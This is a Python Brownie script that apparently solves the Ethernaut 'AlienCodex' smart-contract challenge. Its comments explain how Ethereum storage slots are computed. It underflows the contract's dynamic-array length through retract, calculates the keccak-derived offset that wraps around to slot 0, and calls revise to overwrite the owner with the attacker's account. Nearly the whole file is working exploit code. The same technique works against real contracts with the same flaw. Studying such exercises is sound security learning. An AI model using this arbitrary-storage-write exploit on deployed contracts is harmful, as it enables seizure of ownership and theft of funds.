from brownie import accounts, config, convert, interface, web3
from eth_utils import keccak

def main():

    # Set up the necessary variables for interacting with the contract
    contract = '0xE01d613e4511E78979C41D8a0c3Ca83F056E050E'
    hacker = accounts.add(config['wallets']['from_key'])
    target = interface.IAlienCodex(contract)

    # Print the current owner of the smart contract
    print(f'Owner: {target.owner()}')

    # Make contact with the contract using the hacker's account
    target.make_contact({'from': hacker})

    # Use the target.retract function to free up all the storage space in the contract
    target.retract({'from': hacker})

    # Check the size of the storage space now available
    array_size = web3.eth.get_storage_at(target.address, 1).hex()
    print(f'Storage size: {convert.to_uint(array_size)}')

    """
    The first position calculated using keccak(convert.to_bytes(1)) represents the storage slot for the first element of the dynamic array in the smart contract.

    In Ethereum, the storage of a smart contract is divided into slots of 32 bytes each. 
    Each slot can be accessed using a unique storage index, 
    which is calculated using the keccak-256 hash function on the index.

    In this case, the index is 1, so the keccak hash of the index (keccak(convert.to_bytes(1))) will give the unique storage index for the first element of the dynamic array. 
    Therefore, first_position represents the storage slot for the first element of the dynamic array, 
    not the first storage slot of the entire smart contract.
    """


    # Determine the position of the first element of the array
    first_position = convert.to_uint(keccak(convert.to_bytes(1)))
    print(f'First position: {first_position}')


    # Calculate the maximum storage pointer for the dynamic array
    zero_position = 2 ** 256 - first_position
    print(f'Zero position: {zero_position}')

    # Call the target.revise function to set the hacker's account as the new owner of the contract
    target.revise(zero_position, hacker.address, {'from': hacker})

    # Print the new owner of the smart contract
    print(f'New owner: {target.owner()}')
